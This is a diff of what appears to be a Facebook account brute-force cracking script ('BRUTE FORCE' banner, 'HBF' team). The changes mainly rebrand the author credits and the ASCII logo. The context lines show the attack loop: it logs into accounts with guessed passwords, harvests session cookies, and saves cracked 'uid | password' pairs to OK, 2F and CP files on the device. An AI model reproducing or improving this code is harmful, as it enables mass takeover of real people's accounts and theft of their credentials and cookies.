@@ -1,6 +1,6 @@
-#created by hassan
+#created by hamii
 #team name hbf
-#tottaly written by hassan Rajput
+#tottaly written by hamid Khawaja
 #!/usr/bin/python3 
 #---------------------[IMPORT]---------------------#
 from bs4 import BeautifulSoup as sop
@@ -292,22 +292,19 @@ else:
     a = ltx
     tag = "AM"
 
-logo ="""    ___           ___           ___           ___           ___           ___     
-     /\__\         /\  \         /\  \         /\  \         /\  \         /\__\    
-    /:/  /        /::\  \       /::\  \       /::\  \       /::\  \       /::|  |   
-   /:/__/        /:/\:\  \     /:/\ \  \     /:/\ \  \     /:/\:\  \     /:|:|  |   
-  /::\  \ ___   /::\~\:\  \   _\:\~\ \  \   _\:\~\ \  \   /::\~\:\  \   /:/|:|  |__ 
- /:/\:\  /\__\ /:/\:\ \:\__\ /\ \:\ \ \__\ /\ \:\ \ \__\ /:/\:\ \:\__\ /:/ |:| /\__\
- \/__\:\/:/  / \/__\:\/:/  / \:\ \:\ \/__/ \:\ \:\ \/__/ \/__\:\/:/  / \/__|:|/:/  /
-      \::/  /       \::/  /   \:\ \:\__\    \:\ \:\__\        \::/  /      |:/:/  / 
-      /:/  /        /:/  /     \:\/:/  /     \:\/:/  /        /:/  /       |::/  /  
-     /:/  /        /:/  /       \::/  /       \::/  /        /:/  /        /:/  /   
-     \/__/         \/__/         \/__/         \/__/         \/__/         \/__/
-\033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36m𝐇𝐑✯𝐃𝐄𝐕𝐈𝐋\033[1;37m═════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗
-\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mHASSANS RAJPUT LUCIFER          \033[1;31m│
-\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mHASSANS RAJPUT LUCIFER           \033[1;31m│
-\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m Hasssn-king-06                  \033[1;31m │
-\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mHASSAN WORLD                  \033[1;31m   │
+logo ="""     \033[1;37m____ \033[1;32m             ______     _______   \033[1;37m____   
+    \033[1;37m(  __)\033[1;32m |\     /|  (  ___ \   (  ____ \ \033[1;37m(__  )  
+    \033[1;37m| (\033[1;32m    | )   ( |  | (   ) )  | (    \/\033[1;37m    ) | 
+    \033[1;37m| |\033[1;32m    | (___) |  | (__/ /   | (__\033[1;37m        | |  
+    \033[1;37m| |\033[1;32m    |  ___  |  |  __ (    |  __)\033[1;37m       | |  
+    \033[1;37m| |\033[1;32m    | (   ) |  | (  \ \   | (\033[1;37m          | |  
+    \033[1;37m| (__\033[1;32m  | )   ( |  | )___) )  | )\033[1;37m        __) |  
+    \033[1;37m(____)\033[1;32m |/     \|  |/ \___/   |/\033[1;37m        (____)
+\033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36m𝐇𝐁𝐅✯𝐓𝐄𝐀𝐌\033[1;37m═════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗
+\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mMUHAMMAD HAMID KHAWAJA          \033[1;31m│
+\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mMUHAMMAD HAMID KHAWAJA          \033[1;31m│
+\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m Hamii-king-06                  \033[1;31m │
+\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mHAMII WORLD                  \033[1;31m   │
 \033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m1.2                          \033[1;31m   │
 \033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mFACEBOOK TRICKS AND HELPING ZONE\033[1;37m {\033[1;36mHBF\033[1;37m} \033[1;31m│
 \033[1;37m╚\033[1;36mⒽⒷⒻ\033[1;37m══════\033[41m\033[1;37m[ 𓆩𝐇𝐈𝐋𝐀𝐑𝐈𝐎𝐔𝐒𓆪 𓆩𝐁𝐑𝐔𝐓𝐄𓆪  𓆩𝐅𝐎𝐑𝐂𝐄𓆪 ]\x1b[0m══════\033[1;36mⒽⒷⒻ\033[1;37m╝
@@ -673,7 +670,7 @@ def freeq(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
-                #os.system("play-audio HASSAN_OK.mp3")
+                #os.system("play-audio HAMII_OK.mp3")
                 print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')
                 cek_apk(session,coki)
                 open('/sdcard/HAMII-OK.txt', 'a').write(uid+' | '+ps+'\n')
@@ -683,7 +680,7 @@ def freeq(uid,pwx,tl):
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     coki1 = coki.split("1000")[1]
                     uid = "1000"+coki1[0:11]
-                    #os.system("play-audio HASSAN_2F.mp3")
+                    #os.system("play-audio HAMII_2F.mp3")
                     print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                     open('/sdcard/HAMII-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
@@ -691,7 +688,7 @@ def freeq(uid,pwx,tl):
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     coki1 = coki.split("1000")[1]
                     uid = "1000"+coki1[0:11]
-                  #  os.system("play-audio HASSAN_CP.mp3")
+                  #  os.system("play-audio HAMII_CP.mp3")
                     print(f'\r{RED}[CP] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')
                     open('/sdcard/HAMII-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
